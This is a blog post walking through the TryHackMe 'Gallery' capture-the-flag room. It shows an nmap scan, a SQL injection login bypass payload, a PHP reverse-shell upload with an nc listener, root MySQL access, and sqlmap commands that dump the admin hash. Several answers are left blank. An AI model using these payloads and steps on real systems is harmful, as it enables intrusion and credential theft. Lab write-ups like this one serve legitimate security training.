---
layout: post
title: TryHackMe writeup - Gallery
date: 2022-08-20 20:00:06 +0530
author: Aarcha Paul
summary: Try to exploit our image gallery system
categories: TryHackMe
thumbnail: jekyll
tags:
 - TryHackMe
 - writeup
 - sqli 
 - cms 
 - rce
---
Today I am trying the TryHackMe CTF room called Gallery. It is a free room and is a SQL injection based challenge. Without further ado, let's get started.

**Question 1:** How many ports are open?
**Walkthrough:** This can be found out with an nmap scan.
`nmap -sC -sV -oN initial.txt 10.10.60.88`
![gallery-nmap](/assets/THM-gallery/gallery-nmap.png)
We can see that ports 80 and 8080 are open. 
**Answer:** 2

**Question 2:** What's the name of the CMS?  
**Walkthrough:** This one was a major rabbit hole and took me quite some time to figure out. The nmap scan shows the name but I thought it was just the website name.
**Answer:** Simple Image Gallery

**Question 3:** What's the hash password of the admin user?  
**Walkthrough:** Since the tags for the room included SQL injection and RCE, I figured those were the kind of exploits I had to look for. A look on searchsploit showed these exploits.
![searchsploit](/assets/THM-gallery/searchsploit.png)
I copied the third exploit to my current directory using `searchsploit -m 5014.py`. On reading through the code, I found an interesting line.
![exploit.png](/assets/THM-gallery/exploit.png)
So I opened the web browser and went to the ip address at port 8080 and went to the login page. 
![2  Visiting Simple Gallery Page](https://user-images.githubusercontent.com/75413146/153704486-a9180690-64ce-4a5c-ba51-31b2f9b857f9.png)
There I pasted in the username as `admin' or '1'='1'#` and the password as `password`. 
 ![7  We r in](https://user-images.githubusercontent.com/75413146/153705113-9e1847a3-3a5e-474f-a3cc-db6d6d9106fc.png) and  voila! We got in. Now we can go to the album page and find function to upload images. We can upload a php-reverse-shell from `/usr/share/webshells/php/` available in kali linux. Before that modify the ip address and port name in the php file.
 
 
Upload the php-reverse-shell and listening on localhost via `nc -lvnp 1337`.
![7 2 Upload shellcode](https://user-images.githubusercontent.com/75413146/153705349-6173c59a-3551-42d8-8a3e-edcd6d32d468.png)

After the shell is uploaded successfully, activate the shell by clicking on the script you uploaded. But don't forget to listen before you activate the shell.
![9 got shell](https://user-images.githubusercontent.com/75413146/153705457-65d471d2-b5ee-472c-b64d-a9f493d78b4e.png)
Also we need hash of an admin user to complete the room
- Use command netstat -altuopn for checking the services runnning on localhost
- We can see 3306 is running which is mysql port.
- Using mysql -u root -p [use password as root]
- accessing the database.
- and we got the admin hash submitting it

![14  databases](https://user-images.githubusercontent.com/75413146/153706239-3c34e211-ac40-44b8-bea1-97ed28ac16e1.png)

![14 2 databases](https://user-images.githubusercontent.com/75413146/153706246-a4230f42-9b67-4820-895e-dd7e3d34aec5.png)

![14 3 database hash](https://user-images.githubusercontent.com/75413146/153706249-57ca5fea-01e4-4fc7-88a2-1ef0184433f2.png)

**Answer:** 

**Question 4:** What's the user flag?
**Walkthrough:** 
**Answer:** 

**Question 5:** What's the root flag?
**Walkthrough:** 
**Answer:** 


------
So there was an exploit for Simple Image Gallery System i.e. sqli (ref is below)
![](https://miro.medium.com/max/1034/1*Rt6Fm0bLhdScCTJgmVSv-Q.png)

let’s save this `right_click>save>test.req` & get this into **sqlmap**

`sudo sqlmap -r test.req --dbs`

![](https://miro.medium.com/max/548/1*CPLJmzCb6P0mlAbfSFQlRw.png)

we found 2 databases:
![](https://miro.medium.com/max/374/1*QSQz2vOEL6TecWhdxqthgg.png)

now get the tables:
`sudo sqlmap -r test.req --current-db gallery_db --tables`
![](https://miro.medium.com/max/660/1*giGSVCdlmqHyH5wIHflyYA.png)

Now get the columns:
`sudo sqlmap -r test.req --current-db gallery_db -T users --columns`
![](https://miro.medium.com/max/476/1*sLVkXoyRIT_kH1e1JlIxdg.png)

let’s dump some data.
`sudo sqlmap -r test.req --current-db gallery_db -T users -C username,password --dump`
![](https://miro.medium.com/max/756/1*pcHjeQC4CrNvFBxI8yu3pw.png)

and we found the admin hash (which we can crack, but it’s a rabbit hole to crack)